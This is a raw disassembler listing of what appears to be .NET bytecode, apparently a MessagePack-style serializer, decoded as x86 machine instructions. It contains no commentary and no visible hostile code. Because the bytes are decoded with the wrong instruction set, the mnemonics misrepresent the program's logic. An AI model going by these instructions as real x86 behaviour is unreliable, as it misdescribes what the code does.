  403bb1:	00 00                	add    %al,(%eax)
  403bb3:	06                   	push   %es
  403bb4:	02 18                	add    (%eax),%bl
  403bb6:	7d 24                	jge    0x403bdc
  403bb8:	00 00                	add    %al,(%eax)
  403bba:	04 16                	add    $0x16,%al
  403bbc:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403bc1:	3a 00                	cmp    (%eax),%al
  403bc3:	00 06                	add    %al,(%esi)
  403bc5:	25 03 28 64 00       	and    $0x642803,%eax
  403bca:	00 06                	add    %al,(%esi)
  403bcc:	6f                   	outsl  %ds:(%esi),(%dx)
  403bcd:	38 00                	cmp    %al,(%eax)
  403bcf:	00 06                	add    %al,(%esi)
  403bd1:	03 6f 56             	add    0x56(%edi),%ebp
  403bd4:	00 00                	add    %al,(%eax)
  403bd6:	06                   	push   %es
  403bd7:	09 17                	or     %edx,(%edi)
  403bd9:	58                   	pop    %eax
  403bda:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403bdf:	2a 06                	sub    (%esi),%al
  403be1:	20 da                	and    %bl,%dl
  403be3:	00 00                	add    %al,(%eax)
  403be5:	00 33                	add    %dh,(%ebx)
  403be7:	0e                   	push   %cs
  403be8:	02 06                	add    (%esi),%al
  403bea:	03 28                	add    (%eax),%ebp
  403bec:	65 00 00             	add    %al,%gs:(%eax)
  403bef:	06                   	push   %es
  403bf0:	28 4f 00             	sub    %cl,0x0(%edi)
  403bf3:	00 06                	add    %al,(%esi)
  403bf5:	2a 06                	sub    (%esi),%al
  403bf7:	20 db                	and    %bl,%bl
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 33                	add    %dh,(%ebx)
  403bfd:	0e                   	push   %cs
  403bfe:	02 06                	add    (%esi),%al
  403c00:	03 28                	add    (%eax),%ebp
  403c02:	65 00 00             	add    %al,%gs:(%eax)
  403c05:	06                   	push   %es
  403c06:	28 4f 00             	sub    %cl,0x0(%edi)
  403c09:	00 06                	add    %al,(%esi)
  403c0b:	2a 06                	sub    (%esi),%al
  403c0d:	20 d0                	and    %dl,%al
  403c0f:	00 00                	add    %al,(%eax)
  403c11:	00 33                	add    %dh,(%ebx)
  403c13:	0f 02 03             	lar    (%ebx),%eax
  403c16:	6f                   	outsl  %ds:(%esi),(%dx)
  403c17:	7a 00                	jp     0x403c19
  403c19:	00 0a                	add    %cl,(%edx)
  403c1b:	67 6a 28             	addr16 push $0x28
  403c1e:	42                   	inc    %edx
  403c1f:	00 00                	add    %al,(%eax)
  403c21:	06                   	push   %es
  403c22:	2a 06                	sub    (%esi),%al
  403c24:	20 d1                	and    %dl,%cl
  403c26:	00 00                	add    %al,(%eax)
  403c28:	00 33                	add    %dh,(%ebx)
  403c2a:	27                   	daa
  403c2b:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403c31:	0b 03                	or     (%ebx),%eax
  403c33:	07                   	pop    %es
  403c34:	16                   	push   %ss
  403c35:	18 6f 45             	sbb    %ch,0x45(%edi)
  403c38:	00 00                	add    %al,(%eax)
  403c3a:	0a 26                	or     (%esi),%ah
  403c3c:	07                   	pop    %es
  403c3d:	28 26                	sub    %ah,(%esi)
  403c3f:	00 00                	add    %al,(%eax)
  403c41:	06                   	push   %es
  403c42:	0b 02                	or     (%edx),%eax
  403c44:	07                   	pop    %es
  403c45:	16                   	push   %ss
  403c46:	28 81 00 00 0a 6a    	sub    %al,0x6a0a0000(%ecx)
  403c4c:	28 42 00             	sub    %al,0x0(%edx)
  403c4f:	00 06                	add    %al,(%esi)
  403c51:	2a 06                	sub    (%esi),%al
  403c53:	20 d2                	and    %dl,%dl
  403c55:	00 00                	add    %al,(%eax)
  403c57:	00 33                	add    %dh,(%ebx)
  403c59:	27                   	daa
  403c5a:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403c60:	0b 03                	or     (%ebx),%eax
  403c62:	07                   	pop    %es
  403c63:	16                   	push   %ss
  403c64:	1a 6f 45             	sbb    0x45(%edi),%ch
  403c67:	00 00                	add    %al,(%eax)
  403c69:	0a 26                	or     (%esi),%ah
  403c6b:	07                   	pop    %es
  403c6c:	28 26                	sub    %ah,(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	06                   	push   %es
  403c71:	0b 02                	or     (%edx),%eax
  403c73:	07                   	pop    %es
  403c74:	16                   	push   %ss
  403c75:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403c79:	0a 6a 28             	or     0x28(%edx),%ch
  403c7c:	42                   	inc    %edx
  403c7d:	00 00                	add    %al,(%eax)
  403c7f:	06                   	push   %es
  403c80:	2a 06                	sub    (%esi),%al
  403c82:	20 d3                	and    %dl,%bl
  403c84:	00 00                	add    %al,(%eax)
  403c86:	00 33                	add    %dh,(%ebx)
  403c88:	25 1e 8d 44 00       	and    $0x448d1e,%eax
  403c8d:	00 01                	add    %al,(%ecx)
  403c8f:	0b 03                	or     (%ebx),%eax
  403c91:	07                   	pop    %es
  403c92:	16                   	push   %ss
  403c93:	1e                   	push   %ds
  403c94:	6f                   	outsl  %ds:(%esi),(%dx)
  403c95:	45                   	inc    %ebp
  403c96:	00 00                	add    %al,(%eax)
  403c98:	0a 26                	or     (%esi),%ah
  403c9a:	07                   	pop    %es
  403c9b:	28 26                	sub    %ah,(%esi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	06                   	push   %es
  403ca0:	0b 02                	or     (%edx),%eax
  403ca2:	07                   	pop    %es
  403ca3:	16                   	push   %ss
  403ca4:	28 82 00 00 0a 28    	sub    %al,0x280a0000(%edx)
  403caa:	42                   	inc    %edx
  403cab:	00 00                	add    %al,(%eax)
  403cad:	06                   	push   %es
  403cae:	2a 00                	sub    (%eax),%al
  403cb0:	1b 30                	sbb    (%eax),%esi
  403cb2:	04 00                	add    $0x0,%al
  403cb4:	47                   	inc    %edi
  403cb5:	00 00                	add    %al,(%eax)
  403cb7:	00 11                	add    %dl,(%ecx)
  403cb9:	00 00                	add    %al,(%eax)
  403cbb:	11 73 79             	adc    %esi,0x79(%ebx)
  403cbe:	00 00                	add    %al,(%eax)
  403cc0:	0a 0a                	or     (%edx),%cl
  403cc2:	02 06                	add    (%esi),%al
  403cc4:	28 58 00             	sub    %bl,0x0(%eax)
  403cc7:	00 06                	add    %al,(%esi)
  403cc9:	06                   	push   %es
  403cca:	6f                   	outsl  %ds:(%esi),(%dx)
  403ccb:	75 00                	jne    0x403ccd
  403ccd:	00 0a                	add    %cl,(%edx)
  403ccf:	d4 8d                	aam    $0x8d
  403cd1:	44                   	inc    %esp
  403cd2:	00 00                	add    %al,(%eax)
  403cd4:	01 0b                	add    %ecx,(%ebx)
  403cd6:	06                   	push   %es
  403cd7:	16                   	push   %ss
  403cd8:	6a 6f                	push   $0x6f
  403cda:	4e                   	dec    %esi
  403cdb:	00 00                	add    %al,(%eax)
  403cdd:	0a 06                	or     (%esi),%al
  403cdf:	07                   	pop    %es
  403ce0:	16                   	push   %ss
  403ce1:	06                   	push   %es
  403ce2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ce3:	75 00                	jne    0x403ce5
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  403cee:	07                   	pop    %es
  403cef:	28 a1 00 00 06 0c    	sub    %ah,0xc060000(%ecx)
  403cf5:	de 0a                	fimuls (%edx)
  403cf7:	06                   	push   %es
  403cf8:	2c 06                	sub    $0x6,%al
  403cfa:	06                   	push   %es
  403cfb:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfc:	33 00                	xor    (%eax),%eax
  403cfe:	00 0a                	add    %cl,(%edx)
  403d00:	dc 08                	fmull  (%eax)
  403d02:	2a 00                	sub    (%eax),%al
  403d04:	01 10                	add    %edx,(%eax)
  403d06:	00 00                	add    %al,(%eax)
  403d08:	02 00                	add    (%eax),%al
  403d0a:	06                   	push   %es
  403d0b:	00 35 3b 00 0a 00    	add    %dh,0xa003b
  403d11:	00 00                	add    %al,(%eax)
  403d13:	00 13                	add    %dl,(%ebx)
  403d15:	30 02                	xor    %al,(%edx)
  403d17:	00 ec                	add    %ch,%ah
  403d19:	00 00                	add    %al,(%eax)
  403d1b:	00 0b                	add    %cl,(%ebx)
  403d1d:	00 00                	add    %al,(%eax)
  403d1f:	11 02                	adc    %eax,(%edx)
  403d21:	7b 24                	jnp    0x403d47
  403d23:	00 00                	add    %al,(%eax)
  403d25:	04 0a                	add    $0xa,%al
  403d27:	06                   	push   %es
  403d28:	45                   	inc    %ebp
  403d29:	0c 00                	or     $0x0,%al
  403d2b:	00 00                	add    %al,(%eax)
  403d2d:	05 00 00 00 05       	add    $0x5000000,%eax
  403d32:	00 00                	add    %al,(%eax)
  403d34:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  403d3a:	00 00                	add    %al,(%eax)
  403d3c:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403d3f:	00 00                	add    %al,(%eax)
  403d41:	1e                   	push   %ds
  403d42:	00 00                	add    %al,(%eax)
  403d44:	00 30                	add    %dh,(%eax)
  403d46:	00 00                	add    %al,(%eax)
  403d48:	00 42 00             	add    %al,0x0(%edx)
  403d4b:	00 00                	add    %al,(%eax)
  403d4d:	54                   	push   %esp
  403d4e:	00 00                	add    %al,(%eax)
  403d50:	00 66 00             	add    %ah,0x0(%esi)
  403d53:	00 00                	add    %al,(%eax)
  403d55:	79 00                	jns    0x403d57
  403d57:	00 00                	add    %al,(%eax)
  403d59:	86 00                	xchg   %al,(%eax)
  403d5b:	00 00                	add    %al,(%eax)
  403d5d:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  403d63:	28 67 00             	sub    %ah,0x0(%edi)
  403d66:	00 06                	add    %al,(%esi)
  403d68:	2a 03                	sub    (%ebx),%al
  403d6a:	02 7b 23             	add    0x23(%ebx),%bh
  403d6d:	00 00                	add    %al,(%eax)
  403d6f:	04 74                	add    $0x74,%al
  403d71:	39 00                	cmp    %eax,(%eax)
  403d73:	00 01                	add    %al,(%ecx)
  403d75:	28 68 00             	sub    %ch,0x0(%eax)
  403d78:	00 06                	add    %al,(%esi)
  403d7a:	2a 03                	sub    (%ebx),%al
  403d7c:	02 7b 23             	add    0x23(%ebx),%bh
  403d7f:	00 00                	add    %al,(%eax)
  403d81:	04 a5                	add    $0xa5,%al
  403d83:	51                   	push   %ecx
  403d84:	00 00                	add    %al,(%eax)
  403d86:	01 28                	add    %ebp,(%eax)
  403d88:	6e                   	outsb  %ds:(%esi),(%dx)
  403d89:	00 00                	add    %al,(%eax)
  403d8b:	06                   	push   %es
  403d8c:	2a 03                	sub    (%ebx),%al
  403d8e:	02 7b 23             	add    0x23(%ebx),%bh
  403d91:	00 00                	add    %al,(%eax)
  403d93:	04 a5                	add    $0xa5,%al
  403d95:	52                   	push   %edx
  403d96:	00 00                	add    %al,(%eax)
  403d98:	01 28                	add    %ebp,(%eax)
  403d9a:	6d                   	insl   (%dx),%es:(%edi)
  403d9b:	00 00                	add    %al,(%eax)
  403d9d:	06                   	push   %es
  403d9e:	2a 03                	sub    (%ebx),%al
  403da0:	02 7b 23             	add    0x23(%ebx),%bh
  403da3:	00 00                	add    %al,(%eax)
  403da5:	04 a5                	add    $0xa5,%al
  403da7:	5e                   	pop    %esi
  403da8:	00 00                	add    %al,(%eax)
  403daa:	01 28                	add    %ebp,(%eax)
  403dac:	6c                   	insb   (%dx),%es:(%edi)
  403dad:	00 00                	add    %al,(%eax)
  403daf:	06                   	push   %es
  403db0:	2a 03                	sub    (%ebx),%al
  403db2:	02 7b 23             	add    0x23(%ebx),%bh
  403db5:	00 00                	add    %al,(%eax)
  403db7:	04 a5                	add    $0xa5,%al
  403db9:	53                   	push   %ebx
  403dba:	00 00                	add    %al,(%eax)
  403dbc:	01 28                	add    %ebp,(%eax)
  403dbe:	6a 00                	push   $0x0
  403dc0:	00 06                	add    %al,(%esi)
  403dc2:	2a 03                	sub    (%ebx),%al
  403dc4:	02 7b 23             	add    0x23(%ebx),%bh
  403dc7:	00 00                	add    %al,(%eax)
  403dc9:	04 a5                	add    $0xa5,%al
  403dcb:	54                   	push   %esp
  403dcc:	00 00                	add    %al,(%eax)
  403dce:	01 6c 28 6a          	add    %ebp,0x6a(%eax,%ebp,1)
  403dd2:	00 00                	add    %al,(%eax)
  403dd4:	06                   	push   %es
  403dd5:	2a 03                	sub    (%ebx),%al
  403dd7:	02 28                	add    (%eax),%ch
  403dd9:	45                   	inc    %ebp
  403dda:	00 00                	add    %al,(%eax)
  403ddc:	06                   	push   %es
  403ddd:	28 6e 00             	sub    %ch,0x0(%esi)
  403de0:	00 06                	add    %al,(%esi)
  403de2:	2a 03                	sub    (%ebx),%al
  403de4:	02 7b 23             	add    0x23(%ebx),%bh
  403de7:	00 00                	add    %al,(%eax)
  403de9:	04 74                	add    $0x74,%al
  403deb:	03 00                	add    (%eax),%eax
  403ded:	00 1b                	add    %bl,(%ebx)
  403def:	28 69 00             	sub    %ch,0x0(%ecx)
  403df2:	00 06                	add    %al,(%esi)
  403df4:	2a 02                	sub    (%edx),%al
  403df6:	03 28                	add    (%eax),%ebp
  403df8:	40                   	inc    %eax
  403df9:	00 00                	add    %al,(%eax)
  403dfb:	06                   	push   %es
  403dfc:	2a 02                	sub    (%edx),%al
  403dfe:	03 28                	add    (%eax),%ebp
  403e00:	41                   	inc    %ecx
  403e01:	00 00                	add    %al,(%eax)
  403e03:	06                   	push   %es
  403e04:	2a 03                	sub    (%ebx),%al
  403e06:	28 67 00             	sub    %ah,0x0(%edi)
  403e09:	00 06                	add    %al,(%esi)
  403e0b:	2a 1b                	sub    (%ebx),%bl
  403e0d:	30 03                	xor    %al,(%ebx)
  403e0f:	00 39                	add    %bh,(%ecx)
  403e11:	00 00                	add    %al,(%eax)
  403e13:	00 12                	add    %dl,(%edx)
  403e15:	00 00                	add    %al,(%eax)
  403e17:	11 02                	adc    %eax,(%edx)
  403e19:	0a 16                	or     (%esi),%dl
  403e1b:	0b 06                	or     (%esi),%eax
  403e1d:	12 01                	adc    (%ecx),%al
  403e1f:	28 49 00             	sub    %cl,0x0(%ecx)
  403e22:	00 0a                	add    %cl,(%edx)
  403e24:	02 7b 27             	add    0x27(%ebx),%bh
  403e27:	00 00                	add    %al,(%eax)
  403e29:	04 2d                	add    $0x2d,%al
  403e2b:	12 02                	adc    (%edx),%al
  403e2d:	02 02                	add    (%edx),%al
  403e2f:	7b 26                	jnp    0x403e57
  403e31:	00 00                	add    %al,(%eax)
  403e33:	04 73                	add    $0x73,%al
  403e35:	31 00                	xor    %eax,(%eax)
  403e37:	00 06                	add    %al,(%esi)
  403e39:	7d 27                	jge    0x403e62
  403e3b:	00 00                	add    %al,(%eax)
  403e3d:	04 de                	add    $0xde,%al
  403e3f:	0a 07                	or     (%edi),%al
  403e41:	2c 06                	sub    $0x6,%al
  403e43:	06                   	push   %es
  403e44:	28 50 00             	sub    %dl,0x0(%eax)
  403e47:	00 0a                	add    %cl,(%edx)
  403e49:	dc 02                	faddl  (%edx)
  403e4b:	7b 27                	jnp    0x403e74
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	04 2a                	add    $0x2a,%al
  403e51:	00 00                	add    %al,(%eax)
  403e53:	00 01                	add    %al,(%ecx)
  403e55:	10 00                	adc    %al,(%eax)
  403e57:	00 02                	add    %al,(%edx)
  403e59:	00 04 00             	add    %al,(%eax,%eax,1)
  403e5c:	24 28                	and    $0x28,%al
  403e5e:	00 0a                	add    %cl,(%edx)
  403e60:	00 00                	add    %al,(%eax)
  403e62:	00 00                	add    %al,(%eax)
  403e64:	13 30                	adc    (%eax),%esi
  403e66:	04 00                	add    $0x0,%al
  403e68:	18 00                	sbb    %al,(%eax)
  403e6a:	00 00                	add    %al,(%eax)
  403e6c:	13 00                	adc    (%eax),%eax
  403e6e:	00 11                	add    %dl,(%ecx)
  403e70:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  403e76:	0a 02                	or     (%edx),%al
  403e78:	06                   	push   %es
  403e79:	16                   	push   %ss
  403e7a:	03 6f 45             	add    0x45(%edi),%ebp
  403e7d:	00 00                	add    %al,(%eax)
  403e7f:	0a 26                	or     (%esi),%ah
  403e81:	06                   	push   %es
  403e82:	28 23                	sub    %ah,(%ebx)
  403e84:	00 00                	add    %al,(%eax)
  403e86:	06                   	push   %es
  403e87:	2a 13                	sub    (%ebx),%dl
  403e89:	30 04 00             	xor    %al,(%eax,%eax,1)
  403e8c:	99                   	cltd
  403e8d:	00 00                	add    %al,(%eax)
  403e8f:	00 14 00             	add    %dl,(%eax,%eax,1)
  403e92:	00 11                	add    %dl,(%ecx)
  403e94:	14 0a                	adc    $0xa,%al
  403e96:	16                   	push   %ss
  403e97:	0b 02                	or     (%edx),%eax
  403e99:	20 a0 00 00 00 32    	and    %ah,0x32000000(%eax)
  403e9f:	12 02                	adc    (%edx),%al
  403ea1:	20 bf 00 00 00 30    	and    %bh,0x30000000(%edi)
  403ea7:	0a 02                	or     (%edx),%al
  403ea9:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  403eaf:	0b 2b                	or     (%ebx),%ebp
  403eb1:	63 02                	arpl   %eax,(%edx)
  403eb3:	20 d9                	and    %bl,%cl
  403eb5:	00 00                	add    %al,(%eax)
  403eb7:	00 33                	add    %dh,(%ebx)
  403eb9:	09 03                	or     %eax,(%ebx)
  403ebb:	6f                   	outsl  %ds:(%esi),(%dx)
  403ebc:	7a 00                	jp     0x403ebe
  403ebe:	00 0a                	add    %cl,(%edx)
  403ec0:	0b 2b                	or     (%ebx),%ebp
  403ec2:	52                   	push   %edx
  403ec3:	02 20                	add    (%eax),%ah
  403ec5:	da 00                	fiaddl (%eax)
  403ec7:	00 00                	add    %al,(%eax)
  403ec9:	33 22                	xor    (%edx),%esp
  403ecb:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403ed1:	0a 03                	or     (%ebx),%al
  403ed3:	06                   	push   %es
  403ed4:	16                   	push   %ss
  403ed5:	18 6f 45             	sbb    %ch,0x45(%edi)
  403ed8:	00 00                	add    %al,(%eax)
  403eda:	0a 26                	or     (%esi),%ah
  403edc:	06                   	push   %es
  403edd:	28 26                	sub    %ah,(%esi)
  403edf:	00 00                	add    %al,(%eax)
  403ee1:	06                   	push   %es
  403ee2:	0a 06                	or     (%esi),%al
  403ee4:	16                   	push   %ss
  403ee5:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  403ee9:	0a 0b                	or     (%ebx),%cl
  403eeb:	2b 28                	sub    (%eax),%ebp
  403eed:	02 20                	add    (%eax),%ah
  403eef:	db 00                	fildl  (%eax)
  403ef1:	00 00                	add    %al,(%eax)
  403ef3:	33 20                	xor    (%eax),%esp
  403ef5:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403efb:	0a 03                	or     (%ebx),%al
  403efd:	06                   	push   %es
  403efe:	16                   	push   %ss
  403eff:	1a 6f 45             	sbb    0x45(%edi),%ch
  403f02:	00 00                	add    %al,(%eax)
  403f04:	0a 26                	or     (%esi),%ah
  403f06:	06                   	push   %es
  403f07:	28 26                	sub    %ah,(%esi)
  403f09:	00 00                	add    %al,(%eax)
  403f0b:	06                   	push   %es
  403f0c:	0a 06                	or     (%esi),%al
  403f0e:	16                   	push   %ss
  403f0f:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403f13:	0a 0b                	or     (%ebx),%cl
  403f15:	07                   	pop    %es
  403f16:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  403f1a:	01 0a                	add    %ecx,(%edx)
  403f1c:	03 06                	add    (%esi),%eax
  403f1e:	16                   	push   %ss
  403f1f:	07                   	pop    %es
  403f20:	6f                   	outsl  %ds:(%esi),(%dx)
  403f21:	45                   	inc    %ebp
  403f22:	00 00                	add    %al,(%eax)
  403f24:	0a 26                	or     (%esi),%ah
  403f26:	06                   	push   %es
  403f27:	28 23                	sub    %ah,(%ebx)
  403f29:	00 00                	add    %al,(%eax)
  403f2b:	06                   	push   %es
  403f2c:	2a 00                	sub    (%eax),%al
  403f2e:	00 00                	add    %al,(%eax)
  403f30:	13 30                	adc    (%eax),%esi
  403f32:	04 00                	add    $0x0,%al
  403f34:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403f35:	00 00                	add    %al,(%eax)
  403f37:	00 15 00 00 11 03    	add    %dl,0x3110000
  403f3d:	28 22                	sub    %ah,(%edx)
  403f3f:	00 00                	add    %al,(%eax)
  403f41:	06                   	push   %es
  403f42:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  403f45:	06                   	push   %es
  403f46:	8e 69 0c             	mov    0xc(%ecx),%gs
  403f49:	16                   	push   %ss
  403f4a:	0d 08 1f 1f 30       	or     $0x301f1f08,%eax
  403f4f:	13 20                	adc    (%eax),%esp
  403f51:	a0 00 00 00 08       	mov    0x8000000,%al
  403f56:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  403f59:	0d 02 09 6f 62       	or     $0x626f0902,%eax
  403f5e:	00 00                	add    %al,(%eax)
  403f60:	0a 2b                	or     (%ebx),%ch
  403f62:	74 08                	je     0x403f6c
  403f64:	20 ff                	and    %bh,%bh
  403f66:	00 00                	add    %al,(%eax)
  403f68:	00 30                	add    %dh,(%eax)
  403f6a:	19 20                	sbb    %esp,(%eax)
  403f6c:	d9 00                	flds   (%eax)
  403f6e:	00 00                	add    %al,(%eax)
  403f70:	0d 02 09 6f 62       	or     $0x626f0902,%eax
  403f75:	00 00                	add    %al,(%eax)
  403f77:	0a 08                	or     (%eax),%cl
  403f79:	d2 0d 02 09 6f 62    	rorb   %cl,0x626f0902
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	0a 2b                	or     (%ebx),%ch
  403f83:	53                   	push   %ebx
  403f84:	08 20                	or     %ah,(%eax)
  403f86:	ff                   	(bad)
  403f87:	ff 00                	incl   (%eax)
  403f89:	00 30                	add    %dh,(%eax)
  403f8b:	27                   	daa
  403f8c:	20 da                	and    %bl,%dl
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	00 0d 02 09 6f 62    	add    %cl,0x626f0902
  403f96:	00 00                	add    %al,(%eax)
  403f98:	0a 08                	or     (%eax),%cl
  403f9a:	68 28 63 00 00       	push   $0x6328
  403f9f:	0a 28                	or     (%eax),%ch
  403fa1:	26 00 00             	add    %al,%es:(%eax)
  403fa4:	06                   	push   %es
  403fa5:	0b 02                	or     (%edx),%eax
  403fa7:	07                   	pop    %es
  403fa8:	16                   	push   %ss
  403fa9:	07                   	pop    %es
  403faa:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403fad:	4c                   	dec    %esp
  403fae:	00 00                	add    %al,(%eax)
  403fb0:	0a 2b                	or     (%ebx),%ch
  403fb2:	24 20                	and    $0x20,%al
  403fb4:	db 00                	fildl  (%eax)
  403fb6:	00 00                	add    %al,(%eax)
  403fb8:	0d 02 09 6f 62       	or     $0x626f0902,%eax
  403fbd:	00 00                	add    %al,(%eax)
  403fbf:	0a 08                	or     (%eax),%cl
  403fc1:	28 4a 00             	sub    %cl,0x0(%edx)
  403fc4:	00 0a                	add    %cl,(%edx)
  403fc6:	28 26                	sub    %ah,(%esi)
  403fc8:	00 00                	add    %al,(%eax)
  403fca:	06                   	push   %es
  403fcb:	0b 02                	or     (%edx),%eax
  403fcd:	07                   	pop    %es
  403fce:	16                   	push   %ss
  403fcf:	07                   	pop    %es
  403fd0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403fd3:	4c                   	dec    %esp
  403fd4:	00 00                	add    %al,(%eax)
  403fd6:	0a 02                	or     (%edx),%al
  403fd8:	06                   	push   %es
  403fd9:	16                   	push   %ss
  403fda:	06                   	push   %es
  403fdb:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403fde:	4c                   	dec    %esp
  403fdf:	00 00                	add    %al,(%eax)
  403fe1:	0a 2a                	or     (%edx),%ch
  403fe3:	00 13                	add    %dl,(%ebx)
  403fe5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403fe8:	88 00                	mov    %al,(%eax)
  403fea:	00 00                	add    %al,(%eax)
  403fec:	16                   	push   %ss
  403fed:	00 00                	add    %al,(%eax)
  403fef:	11 14 0a             	adc    %edx,(%edx,%ecx,1)
  403ff2:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  403ff8:	07                   	pop    %es
  403ff9:	20 ff                	and    %bh,%bh
  403ffb:	00 00                	add    %al,(%eax)
  403ffd:	00 30                	add    %dh,(%eax)
  403fff:	19 20                	sbb    %esp,(%eax)
  404001:	c4 00                	les    (%eax),%eax
  404003:	00 00                	add    %al,(%eax)
  404005:	0c 02                	or     $0x2,%al
  404007:	08 6f 62             	or     %ch,0x62(%edi)
  40400a:	00 00                	add    %al,(%eax)
  40400c:	0a 07                	or     (%edi),%al
  40400e:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  404011:	08 6f 62             	or     %ch,0x62(%edi)
  404014:	00 00                	add    %al,(%eax)
  404016:	0a 2b                	or     (%ebx),%ch
  404018:	53                   	push   %ebx
  404019:	07                   	pop    %es
  40401a:	20 ff                	and    %bh,%bh
  40401c:	ff 00                	incl   (%eax)
  40401e:	00 30                	add    %dh,(%eax)
  404020:	27                   	daa
  404021:	20 c5                	and    %al,%ch
  404023:	00 00                	add    %al,(%eax)
  404025:	00 0c 02             	add    %cl,(%edx,%eax,1)
  404028:	08 6f 62             	or     %ch,0x62(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	0a 07                	or     (%edi),%al
  40402f:	68 28 63 00 00       	push   $0x6328
  404034:	0a 28                	or     (%eax),%ch
  404036:	26 00 00             	add    %al,%es:(%eax)
  404039:	06                   	push   %es
  40403a:	0a 02                	or     (%edx),%al
  40403c:	06                   	push   %es
  40403d:	16                   	push   %ss
  40403e:	06                   	push   %es
  40403f:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404042:	4c                   	dec    %esp
  404043:	00 00                	add    %al,(%eax)
  404045:	0a 2b                	or     (%ebx),%ch
  404047:	24 20                	and    $0x20,%al
  404049:	c6 00 00             	movb   $0x0,(%eax)
  40404c:	00 0c 02             	add    %cl,(%edx,%eax,1)
  40404f:	08 6f 62             	or     %ch,0x62(%edi)
  404052:	00 00                	add    %al,(%eax)
  404054:	0a 07                	or     (%edi),%al
  404056:	28 4a 00             	sub    %cl,0x0(%edx)
  404059:	00 0a                	add    %cl,(%edx)
  40405b:	28 26                	sub    %ah,(%esi)
  40405d:	00 00                	add    %al,(%eax)
  40405f:	06                   	push   %es
  404060:	0a 02                	or     (%edx),%al
  404062:	06                   	push   %es
  404063:	16                   	push   %ss
  404064:	06                   	push   %es
  404065:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404068:	4c                   	dec    %esp
  404069:	00 00                	add    %al,(%eax)
  40406b:	0a 02                	or     (%edx),%al
  40406d:	03 16                	add    (%esi),%edx
  40406f:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404075:	00 0a                	add    %cl,(%edx)
  404077:	2a 13                	sub    (%ebx),%dl
  404079:	30 04 00             	xor    %al,(%eax,%eax,1)
  40407c:	21 00                	and    %eax,(%eax)
  40407e:	00 00                	add    %al,(%eax)
  404080:	13 00                	adc    (%eax),%eax
  404082:	00 11                	add    %dl,(%ecx)
  404084:	02 20                	add    (%eax),%ah
  404086:	cf                   	iret
  404087:	00 00                	add    %al,(%eax)
  404089:	00 6f 62             	add    %ch,0x62(%edi)
  40408c:	00 00                	add    %al,(%eax)
  40408e:	0a 03                	or     (%ebx),%al
  404090:	28 84 00 00 0a 0a 02 	sub    %al,0x20a0a00(%eax,%eax,1)
  404097:	06                   	push   %es
  404098:	28 26                	sub    %ah,(%esi)
  40409a:	00 00                	add    %al,(%eax)
  40409c:	06                   	push   %es
  40409d:	16                   	push   %ss
  40409e:	1e                   	push   %ds
  40409f:	6f                   	outsl  %ds:(%esi),(%dx)
  4040a0:	4c                   	dec    %esp
  4040a1:	00 00                	add    %al,(%eax)
  4040a3:	0a 2a                	or     (%edx),%ch
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	00 13                	add    %dl,(%ebx)
  4040a9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4040ac:	1d 01 00 00 00       	sbb    $0x1,%eax
  4040b1:	00 00                	add    %al,(%eax)
  4040b3:	00 03                	add    %al,(%ebx)
  4040b5:	16                   	push   %ss
  4040b6:	6a 3f                	push   $0x3f
  4040b8:	8a 00                	mov    (%eax),%al
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	03 1f                	add    (%edi),%ebx
  4040be:	7f 6a                	jg     0x40412a
  4040c0:	30 09                	xor    %cl,(%ecx)
  4040c2:	02 03                	add    (%ebx),%al
  4040c4:	d2 6f 62             	shrb   %cl,0x62(%edi)
  4040c7:	00 00                	add    %al,(%eax)
  4040c9:	0a 2a                	or     (%edx),%ch
  4040cb:	03 20                	add    (%eax),%esp
  4040cd:	ff 00                	incl   (%eax)
  4040cf:	00 00                	add    %al,(%eax)
  4040d1:	6a 30                	push   $0x30
  4040d3:	14 02                	adc    $0x2,%al
  4040d5:	20 cc                	and    %cl,%ah
  4040d7:	00 00                	add    %al,(%eax)
  4040d9:	00 6f 62             	add    %ch,0x62(%edi)
  4040dc:	00 00                	add    %al,(%eax)
  4040de:	0a 02                	or     (%edx),%al
  4040e0:	03 d2                	add    %edx,%edx
  4040e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4040e3:	62 00                	bound  %eax,(%eax)
  4040e5:	00 0a                	add    %cl,(%edx)
  4040e7:	2a 03                	sub    (%ebx),%al
  4040e9:	20 ff                	and    %bh,%bh
